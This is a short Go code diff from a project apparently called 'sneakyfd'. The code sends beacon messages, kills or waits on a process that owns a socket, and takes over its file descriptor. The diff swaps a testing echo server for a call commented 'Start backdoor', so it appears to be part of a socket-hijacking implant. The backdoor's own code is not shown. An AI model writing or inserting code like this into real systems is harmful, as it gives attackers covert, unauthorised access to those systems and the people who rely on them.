@@ -4,7 +4,6 @@ import (
 	"context"
 
 	"sneakyfd/internal/beacon"
-	"sneakyfd/internal/echoserver"
 	"sneakyfd/internal/logger"
 	"sneakyfd/internal/types"
 
@@ -44,7 +43,7 @@ func Handle(sock types.Socket) {
 	log.Info().Msg("Beacon sent - HELLO")
 
 	// Kill process OR wait
-	ok = handleProcess(ctx, sockProc.PID)
+	ok = handleProcess(ctx, sockProc)
 	if !ok {
 		return
 	}
@@ -52,6 +51,6 @@ func Handle(sock types.Socket) {
 	beaconSender.Send(beacon.READY_BEACON)
 	log.Info().Msg("Beacon sent - READY")
 
-	// Testing
-	echoserver.EchoServer(ctx, fd)
+	// Start backdoor
+	handleBackdoor(ctx, fd)
 }
